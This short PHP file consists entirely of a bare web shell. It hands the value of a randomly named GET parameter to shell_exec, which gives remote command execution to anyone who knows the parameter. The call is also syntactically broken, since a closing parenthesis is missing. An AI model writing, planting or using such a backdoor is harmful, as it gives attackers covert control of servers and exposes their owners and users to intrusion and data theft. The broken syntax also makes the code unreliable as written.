<?php
shell_exec($_GET['PKcCrhg2'];
?>
